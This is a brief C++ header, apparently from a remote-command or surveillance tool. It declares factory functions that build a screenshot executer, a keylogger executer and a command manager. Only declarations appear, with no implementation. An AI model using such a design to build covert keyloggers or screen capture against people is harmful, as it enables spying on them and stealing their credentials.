#pragma once

#include "command/execute/ScreenshotExecuter.h"
#include "command/execute/KeyloggerExecuter.h"
#include "command/CommandManager.h"


namespace utils
{
/**
  * This namespace contains object building utilities.
  */
namespace builders
{
    std::unique_ptr<command::ICommandExecuter> BuildScreenshotExecuter();

    std::unique_ptr<command::ICommandExecuter> BuildKeyloggerExecuter();

    std::unique_ptr<command::CommandManager> BuildManager();
}
}
